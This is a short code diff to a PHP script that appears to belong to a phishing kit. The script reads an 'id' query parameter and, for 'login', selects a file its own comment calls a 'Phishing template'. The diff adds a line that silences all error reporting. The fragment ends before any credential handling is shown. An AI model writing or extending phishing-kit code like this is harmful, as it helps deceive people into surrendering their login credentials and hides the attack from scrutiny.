@@ -1,4 +1,5 @@
 <?php
+error_reporting(0); // Turn off all error reporting
 $id = $_GET["id"];
 if ($id == "login") {
       $myFile = "login.jpg"; //Phishing template.
